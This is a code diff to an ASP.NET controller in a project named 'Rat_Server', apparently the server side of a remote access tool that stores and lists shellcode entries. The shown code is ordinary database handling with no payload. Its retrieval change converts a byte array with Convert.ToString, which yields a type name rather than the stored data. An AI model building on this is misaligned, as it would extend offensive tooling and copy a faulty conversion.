@@ -3,6 +3,7 @@ using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.EntityFrameworkCore;
 using Org.BouncyCastle.Utilities;
+using Rat_Server.Model.DataConverter;
 using Rat_Server.Model.Context;
 using Rat_Server.Model.DTOs;
 using Rat_Server.Model.Entities;
@@ -58,15 +59,22 @@ namespace Rat_Server.Controllers
                 return StatusCode(StatusCodes.Status409Conflict);
             }
 
-            await _context.ShellCodes.AddAsync(new ShellCode
+            try
             {
-                Name = shellCodeDto.Name,
-                Code = shellCodeDto.Code
-            });
+                await _context.ShellCodes.AddAsync(new ShellCode
+                {
+                    Name = shellCodeDto.Name,
+                    Code = ShellCodeConverter.ToByteArray(shellCodeDto.Code)
+                });
 
-            await _context.SaveChangesAsync();
+                await _context.SaveChangesAsync();
 
-            return StatusCode(StatusCodes.Status201Created);
+                return StatusCode(StatusCodes.Status201Created);
+            }
+            catch(ArgumentException ex)
+            {
+                return BadRequest(ex);
+            }
         }
 
         [HttpGet("GetAllShellCode")]
@@ -76,7 +84,7 @@ namespace Rat_Server.Controllers
             return await _context.ShellCodes.Select(b => new ShellCodeDto
             {
                 Name = b.Name,
-                Code = b.Code
+                Code = Convert.ToString(b.Code)
             }).ToListAsync();
         }
     }
